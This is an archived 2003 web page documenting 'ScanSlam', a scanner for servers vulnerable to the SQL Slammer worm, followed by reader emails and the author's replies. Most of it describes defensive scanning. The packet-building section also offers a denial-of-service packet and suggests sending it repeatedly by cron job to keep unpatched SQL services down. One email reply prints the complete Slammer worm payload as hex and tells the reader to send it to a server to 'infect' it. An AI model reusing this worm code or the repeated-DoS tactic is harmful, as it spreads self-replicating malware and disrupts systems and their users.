<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0043)http://www.robertgraham.com/tools/scanslam/ -->
<HTML><HEAD><TITLE>ScanSlam - SQLslammer vulnerability scanner</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2800.1264" name=GENERATOR></HEAD>
<BODY>
<H1>ScanSlam - SQLslammer vulnerability scanner</H1>This tool scans for systems 
that might be vulnerble to the SQL slammer worm. Get those systems before 
hackers get you. <BR><B>THIS TOOLS HAS BEEN BARELY TESTED, IT MAY NOT WORK, IT 
WAS THROWN TOGETHER BY ME</B> <BR>Download: [<A 
href="http://www.robertgraham.com/tools/scanslam/scanslam.exe">scanslam.exe</A> 
] (Linux soon, maybe)<BR>Comments: <A 
href="mailto:scanslam@robertgraham.com">scanslam@robertgraham.com</A><BR>
<P>
<H2>Basic Usage</H2>This is a <B>command-line</B> tool, not a GUI. 
<P>It is built for bulk scanning of networks. Specifically, it is built to run 
at the same speed as the worm -- possibly a 100,000 hosts scanned per second. 
This means you can reasonable scan your Class A 10.x.x.x subnet in a few 
minutes, with the main limitation on whether your links can handle it. Since 
your links can't handle the load, the scanner throttles to any speed you choose 
(default 100 packets/second), and shuffles/randomizes the scan range so that you 
don't hit slower links as hard (even when you are scanning quickly). 
<P>This is a <B>command-line</B> tool. The output is a series of IP address sent 
to stout. It looks somethinge like: 
<P><PRE>C:\&gt;scanslam 192.168.0.0-192.168.255.255
192.168.1.130: unpatched
192.168.73.21: bad response:
 73 61 6d 70 6c 65 20 62 61 64 20 6f 75 74 70 75 sample bad outpu
 74 00                                           t.
</PRE>
<P>The address [192.168.1.130] has not been patched properly. The other system 
[192.168.72.21] isn't running MS SQL on that port, but gave back some spurious 
response. 
<P>
<H2>Difference Reporting</H2>Once you have fixed machines, you might want to 
verify just those machines to verify you have patched them. If you have only 100 
machines that you've patched, then this will be a lot faster (less bandwidth) 
than rescanning an entire range. This can be done with the following technique: 
<P><PRE>C:\&gt;scanslam 192.168.0.0-192.168.255.255 &gt; report.txt

... read foo.txt, fix unpatched systems ...

C:\&gt;copy report.txt again.txt
C:\scanslam -fagain.txt
192.168.1.130: unpatched

... oops, I missed that one system that I thought I fixed...
</PRE>
<P>Note that the '-f' parameter can read in any file that contains a list of IP 
addresses or ranges, one entry per line. 
<H2>Pausing</H2>If you hit the &lt;ctrl-c&gt; key AND you have specified the -f 
option, the current state will be written to the file. You can then re-launch 
the scanner later with the file inputs. This lets you stop then restart the scan 
without having to rescan hosts or lose data. 
<P><PRE><P>
<PRE>C:\&gt;scanslam -fstate.txt 10.0.0.0-10.255.255.255
--- Copyright 2003 Internet Security Systems ---
 http://www.robertgraham.com/tools/scanslam/

state.txt: No such file or directory
info: &lt;ctrl-c&gt;, will stop in 3 seconds
info: state saved to state.txt

C:\&gt;type state.txt | more
-c
-fstate.txt
-p1434
-r100.000000
-s0
10.0.40.105-10.0.42.138
10.0.124.15-10.255.255.254
10.0.71.241-10.0.72.30
10.0.0.0-10.0.7.206
10.0.26.148
10.0.42.142-10.0.48.64
10.0.72.34
10.0.25.159-10.0.26.4
10.0.63.204-10.0.65.95
10.0.25.6-10.0.25.26
10.0.26.109-10.0.26.144
10.0.26.146
10.0.67.53-10.0.70.128
10.0.65.177-10.0.67.51
10.0.25.84
10.0.25.154-10.0.25.157
10.0.25.85
10.0.24.221-10.0.25.3
...

C:\&gt;scanslam -fstate.txt
...

</PRE></PRE>
<P>In the above example, the scan was started with a state file. The file didn't 
exist, so an error message was generated -- that's not important. During the 
scan, I hit &lt;ctrl-c&gt;. This saved the current unscanned ranges to the file. 
Notice how these have been randomized a bit: remember that the system is trying 
to distribute the load across many links, so it mixes up the order in which is 
scans systems. 
<H2>Choose Source Port</H2>Large numbers of ISPs have filtered port 1434 to stop 
SQLslammer from hitting machines. However, many have a rule that overrides this 
if the source is port 53. This when the system isn't running SQL (most systems), 
they may innocently choose port 1434 as the <B>source</B> for things like DNS 
lookups, which becomes the <B>destination</B> port when firewalls respond. These 
systems won't know why their DNS lookups fail. Setting an override rule of port 
53 allows DNS to work (this was mentioned in the original advisory). 
<P>Similar situations might exist for other popular ports, such as 161 for SNMP. 

<P><PRE>C:\&gt;scanslam -s53 192.168.0.0-192.168.255.255
</PRE>
<P>
<H2>High-speed</H2>This is built for extremely large customers. A broad-spectrum 
scanner that does lots of checks can't do any particular one fast. The way to 
get speed is remove checks. If you remove all the checks but one, then the 
system can be hyper-fast. This is the fastest scanner possible, easily reaching 
speeds of 100,000 hosts per second, scanning the entire Class A 10.x.x.x address 
range in just a few minutes -- assuming your are connected to a GigE interface 
and you don't DoS any of the links. 
<P>You shouldn't run it this fast, but you may want to increase the default from 
1000 hosts-per-second to 1000., as in the following example. 
<P><PRE>C:\&gt;scanslam -r1000 192.168.0.0-192.168.255.255
</PRE>
<H2>Build your own packets</H2><PRE>c:\&gt;scanslam -cfoo.txt 192.168.1.1
</PRE>where "foo.txt" looks like <PRE>08 65 65 65 65 65 65
</PRE>If you'll remember from the original advisory, a packet starting with 08 
will DoS the service. This is one way of not just detecting this problem but 
doing something about it. It won't patch the systems, but if you keep doing this 
(cron job/) it will prevent SQL systems from running. Users will eventually get 
pissed off enough to patch their systems. 
<P>Note that the -d instead of -c will craft a DoS packet for you (without 
having a file). 
<P>
<HR>

<HR>
Blog: here are some comments from e-mail. Remember this tool is not supported, 
but I do what I can. 
<HR>
<PRE style="BACKGROUND: #cccc99">Subject: Scanslam
Date: Wed, 29 Jan 2003 13:24:43 -0600

Robert,
   I was using your product to test out a system that we patched and it came
back as unpatched.  The system has been upgraded to SQL Server 2000, SP3,
and we ran a SQL statement to make sure that it was patched correctly.  The
SQL statement came back as 8.00.760 SP3 Developer Edition.  Is there a
verbose option that we can use to figure out what it is reporting?
   Any help would be greatly appreciated.
</PRE>
<BLOCKQUOTE>Well, you can also try to infect it. Create a file named 
  "infect.txt" with the following contents. Then run "scanslam -cinfect.txt 
  10.1.2.3", where "10.1.2.3" is the server in question. This will infect that 
  machine with the worm if it hasn't been patched. If the patch didn't work, you 
  want to now, and if it the patched work, this is totally harmless. Either way, 
  you want to know the answer now. So do I, please send me e-mail. <PRE>04 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 dc c9 b0 42 eb
0e 01 01 01 01 01 01 01 70 ae 42 01 70 ae 42 90
90 90 90 90 90 90 90 68 dc c9 b0 42 b8 01 01 01
01 31 c9 b1 18 50 e2 fd 35 01 01 01 05 50 89 e5
51 68 2e 64 6c 6c 68 65 6c 33 32 68 6b 65 72 6e
51 68 6f 75 6e 74 68 69 63 6b 43 68 47 65 74 54
66 b9 6c 6c 51 68 33 32 2e 64 68 77 73 32 5f 66
b9 65 74 51 68 73 6f 63 6b 66 b9 74 6f 51 68 73
65 6e 64 be 18 10 ae 42 8d 45 d4 50 ff 16 50 8d
45 e0 50 8d 45 f0 50 ff 16 50 be 10 10 ae 42 8b
1e 8b 03 3d 55 8b ec 51 74 05 be 1c 10 ae 42 ff
16 ff d0 31 c9 51 51 50 81 f1 03 01 04 9b 81 f1
01 01 01 01 51 8d 45 cc 50 8b 45 c0 50 ff 16 6a
11 6a 02 6a 02 ff d0 50 8d 45 c4 50 8b 45 c0 50
ff 16 89 c6 09 db 81 f3 3c 61 d9 ff 8b 45 b4 8d
0c 40 8d 14 88 c1 e2 04 01 c2 c1 e2 08 29 c2 8d
04 90 01 d8 89 45 b4 6a 10 8d 45 b0 50 31 c9 51
66 81 f1 78 01 51 8d 45 03 50 8b 45 ac 50 ff d6
eb ca                                          
</PRE>Also, use the "-d" option to see if you can crash the service. Remember 
  that there were three separate vulnerabilities: a echo-flood (which I scan 
  for), a DoS (which -d does), and the buffer-overflow (which the worm uses). 
</BLOCKQUOTE>
<HR>
<PRE style="BACKGROUND: #cccc99">Subject: ScanSlam
Date: Mon, 27 Jan 2003 13:50:53 -0500

C:\&gt;scanslam 10.51.xxx.11-10.51.xxx.254  &lt;===purposely removed octet
numbers.
-- Copyright 2003 Internet Security Systems ---
http://www.robertgraham.com/tools/scanslam/


C:\&gt;
C:\&gt;  &lt;---DOES this mean I'm clean, Robert?
</PRE>
<BLOCKQUOTE>Probably. My user-interface doesn't give an "all clean" or "done" 
  message, but when it stops running like that above, this is what it means. 
  <P>If the machine is patched, it doesn't respond. However, if the network 
  dropped the packet, I won't see a response, either. Therefore, when my tool 
  doesn't see a response, I don't know precisely what happened. I recommend 
  running the tool twice to be sure all packets got through. 
</P></BLOCKQUOTE></BODY></HTML>
